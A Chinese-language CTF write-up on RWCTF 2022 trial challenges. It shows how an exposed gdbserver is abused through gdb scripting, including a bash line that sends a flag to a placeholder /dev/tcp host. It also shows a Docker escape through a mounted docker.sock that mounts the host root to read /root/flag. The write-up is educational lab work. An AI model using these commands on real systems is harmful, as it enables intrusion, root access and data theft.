---
title: rwctf2022体验赛 debugger & docker
date: 2022-01-23 19:03:47
permalink: /pages/c796d2/
categories:
  - ctf_wp
  - rwctf
tags:
  - 
---
# rw2022 体验赛wp - debugger & docker

[[toc]]



其实在sctf2021出题过程中， 喊队友出了个debuger控制台的题目，和之前docker暴露控制台端口被人搞了，想出个docker控制台的题目，但是一个队友咕了，一个没时间搭环境了。

却正好在今年的第一场比赛中看到了这么两个题目题目，确实有趣， 其实有点像misc。

## remote-debuger

其实比较简单，给的题目就是个gdbserver， 然后gdb内使用 

```
target remote ip:port
```

进行连接， 

本地可以简单搭起来环境，最开始直接想使用 gdb内置的call指令，直接调用函数，然后想反弹shell出来

```
call (int)execl("/bin/sh", "bash", "-c", "bash -c 'cat flag > /dev/tcp/ip/port'", 0)
```

但是运行报错，提示不允许修改 `st0`寄存器，看了下这个是浮点运算系列的寄存器，而且题目本身是64位不应该有问题，

然后翻阅他的gdbserver代码，这个不是标准实现的gdbserver， 所以在这个位置限制死了，不允许修改那个寄存器。

```c
# arch.h
#ifdef __x86_64__

#include <sys/reg.h>

#define SZ 8
#define FEATURE_STR "l<target version=\"1.0\"><architecture>i386:x86-64</architecture></target>"
static uint8_t break_instr[] = {0xcc};

#define PC RIP
#define EXTRA_NUM 57
#define EXTRA_REG ORIG_RAX
#define EXTRA_SIZE 8

typedef struct user_regs_struct regs_struct;

// gdb/features/i386/64bit-core.c
struct reg_struct regs_map[] = {
    {RAX, 8},
    {RBX, 8},
    {RCX, 8},
    {RDX, 8},
    {RSI, 8},
    {RDI, 8},
    {RBP, 8},
    {RSP, 8},
    {R8, 8},
    {R9, 8},
    {R10, 8},
    {R11, 8},
    {R12, 8},
    {R13, 8},
    {R14, 8},
    {R15, 8},
    {RIP, 8},
    {EFLAGS, 4},
    {CS, 4},
    {SS, 4},
    {DS, 4},
    {ES, 4},
    {FS, 4},
    {GS, 4},
};

#endif /* __x86_64__ */
```

于是考虑，不允许gdb修改寄存器，但是题目本身运行的时候可以修改， 我们只需要设置好参数, 即设置好传参寄存器，然后设置好$rip即可，试了下gdb的set指令，可以运行。

那么对于字符串，我们可以跑循环去设置，

```
set $str="...."
set $len=xx # len(str)
set $i=0
while($i<$len)
  set {char}$addr=$str[$i]
  set $i++
  set $addr++
end 
set $target=$start4-$len
x/s $target
```

于是直接得到这么一串gdb指令。这时候仍然考虑反弹shell， 但是本地docker内ok， 远程不行，猜测不出网，

于是使用 open read， 最后x/s 即可打印。

```
set $start1=xxx
set $start2=$start1+8

set $i=0
set $len=5
set $str="/flag"
while($i<$len)
  set {char}$start1=$str[$i]
  set $i++
  set $start1++
end 
set $flag=$start1-$len
x/s $flag
set $buf=$start2

set {void*}$rsp=main
b main 

set $rdi=$flag
set $rsi=0
set $rdx=0
set $rip=open
c
set {void*}$rsp=main
set $rdi=3
set $rsi=$buf
set $rdx=0x40
set $rip=read
c
x/s $buf
```



## be-a-docker-escaper

### 题目文件

首先看下相关文件，

dockerfile是docker环境启动的文件，在其中可以看到启动了一个qemu虚拟机，

```

CMD qemu-system-x86_64 \
  -drive "file=focal-server-cloudimg-amd64.img,format=qcow2" \
  -device rtl8139,netdev=net0 \
  -m 1G \
  -netdev user,id=net0,hostfwd=tcp::5555-:22 \
  -smp 2 \
  -nographic 
```

并映射出来了 22端口，这个是ssh登陆端口，

然后向上看到设置img文件等操作，可以发现user-data文件，

`cloud-locals` 用来通过user-data文件生成 `user-data.img`文件

查看这个文件，

可以看到内置安装了docker和ssh， 并拉取了ubuntu的image 

```
apt: 
  primary:
    - arches: [default]
      uri: http://mirrors.aliyun.com/ubuntu/
      search: 
        - http://mirrors.aliyun.com/ubuntu/

packages:
  - docker.io
  - openssh-server
  
runcmd:
  - docker pull ubuntu
```

然后用户

```
groups:
  - docker

users:
  #- name: root
  #  ssh_authorized_keys:
  #    - "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEbCiWqn8LWe1Btot7vOTchv5MYfTaE8yHShPI6RP+Rx"
  - name: container
    groups: docker
    ssh_authorized_keys:
      - "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEbCiWqn8LWe1Btot7vOTchv5MYfTaE8yHShPI6RP+Rx"
    shell: /home/container/run.sh
```

这里有个ssh登陆的密钥设置，外面给了个ssh密钥，可以通过这个方案登陆进来。用户名 `container`

文件, 可以看到docker run的脚本，然后可以看到flag位置在`/root/flag`， 

```
write_files:
  - content: | 
      #!/bin/bash
      docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu # You are here!
    path: /home/container/run.sh
    permissions: "0755"
  - content: |
      rwctf{THIS_IS_A_TEST_FLAG}
    permissions: "0000"
    path: /root/flag
  - content: |
      {
        "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]
      }
    path: /etc/docker/daemon.json
  
```

大致了解了，看下这个docker， -i 运行，

```
docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu # You are here!
```

而且可以看到用户的默认shell就是这个文件，所以我们ssh进入以后会立刻运行这个文件，进入这个docker内。

ok， 于是我们连接远程时， 也是如此， 直接ssh进入到qemu并进入其中的docker中，

本地调试的话，其实可以docker build . -t docker-escaper， 然后docker run 将5555端口映射出来，然后可以通过ssh连接进入， `ssh container@ip  -p5555 -i id_ed25519` 

### 本地调试

我们看到这个docker启动的时候的错误在于映射了端口到container内，

简单来说，docker程序本身其实分为前台和后台程序，后台为daemon， 前台就是我们看到的shell中的docker 指令。

计算机上的docker其实都是在daemon中运行， 我们控制的前台通过一定的通讯协议控制daemon， 一般这个链接默认为 `unix:///var/run/docker.sock`， 即`unix://`unix文件，指向`/var/run/docker.sock`文件，我们也可以通过ssh tcp 等都ok， 如果前台docker有多个后台也可以通过`docker context`系列指令来进行控制。

我们可以看到， 这个程序启动docker的时候使用 `-v`参数将 `/var/run/docker.sock`映射到了容器内，也就是说容器可以访问到这个sock链接，那么如果容器中有前台程序docker指令的话，可以通过这个文件控制主机上的daemon， 然后启动一个容器并挂在根目录，进入这个容器内即可访问根目录，而且是root权限。

于是我搜索了一些相关的资料，主要是搜索 `docker mount /var/run/docker.sock to container`时， 可以看到一种称为 `docker out of docker`的技术，用于在container中使用docker，而且避免嵌套docker daemon带来的性能折损，于是直接往容器内挂在了主机的`/var/run/docker.run`文件，

![image.png](https://s2.loli.net/2022/01/23/VpFb9SOU246DfLY.png)



于是我们本地调试其实可以简单的直接映射过来，

在本地起一个docker， `docker run -d  -i -m 128m -v /var/run/docker.sock:/s  ubuntu`, 

然后在内部ubuntn中安装docker， 并使用--host指定daemon为`unix:///s`， 

![image.png](https://s2.loli.net/2022/01/23/PLEd6VB1JZsymFt.png)

于是命令如下：

```
sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g" /etc/apt/sources.list 
apt update 
apt install -y docker.io 
docker --host unix:///s run --rm -v /:/r ubuntu cat /r/root/flag
```